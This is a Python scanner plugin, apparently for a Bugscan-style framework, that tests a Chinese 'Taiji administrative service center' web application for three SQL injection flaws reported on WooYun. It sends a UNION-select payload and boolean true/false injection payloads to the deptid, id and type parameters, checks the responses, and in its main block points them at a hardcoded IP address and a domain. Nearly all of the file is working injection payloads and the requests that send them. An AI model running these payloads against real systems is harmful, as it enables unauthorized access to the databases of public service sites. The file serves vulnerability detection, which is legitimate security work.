#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 太极行政服务中心三处SQL注入
author: yichin
refer: 
    http://www.wooyun.org/bugs/wooyun-2010-085183
    http://www.wooyun.org/bugs/wooyun-2010-085258
    http://www.wooyun.org/bugs/wooyun-2010-085369
description:
    bmtd.do?method=dept&deptid=00942001X (GET) parameter:deptid
    union
'''

import re

def assign(service, arg):
    if service == 'sztaiji_zw':
        return True, arg

def audit(arg):
    # proxy = ('1237.0.0.1', 8887)
    #第一处
    url = arg + 'bmtd.do?method=dept&deptid=00942001%27%20union%20select%20CHR(87)||CHR(116)||CHR(70)||CHR(97)||CHR(66)||CHR(99)%20from%20dual--'
    code, head, res, err, _ = curl.curl2(url)
    if(code == 200) and ('WtFaBc' in res):
        security_hole('SQL Injection: ' + url)
    #第二处
    url_true = arg + 'newsinfo.do?id=wtfwablsfdsi%27%20or%201234%2B5432=6666%20and%20rownum<2--&type=7'
    url_false = arg + 'newsinfo.do?id=wtfwablsfdsi%27%20or%201234%2B5432=6667%20and%20rownum<2--&type=7'
    code, head, res_true, err, _ = curl.curl2(url_true)
    if code != 200:
        return False
    code, head, res_false, err, _ = curl.curl2(url_false)
    if code != 200:
        return False
    if ('null' in res_false) and ('null' not in res_true):
        security_hole('SQL Injection: ' + url_true)
    #第三处
    url_true = arg + 'morebrowsnews.do?type=12335421%20or%201234%2B5432=6666'
    url_false = arg + 'morebrowsnews.do?type=12335421%20or%201234%2B5432=6667'
    code, head, res_true, err, _ = curl.curl2(url_true)
    if code != 200:
        return False
    code, head, res_false, err, _ = curl.curl2(url_false)
    if code != 200:
        return False
    pattern = '<a href="newsinfo.do?id='
    if (pattern in res_true) and (pattern not in res_false):
        security_hole('SQL Injection: ' + url_true)
if __name__ == '__main__':
    from dummy import *
    audit(assign('sztaiji_zw', 'http://58.42.249.116/')[1])
    audit(assign('sztaiji_zw', 'http://www.tlsp.net/')[1])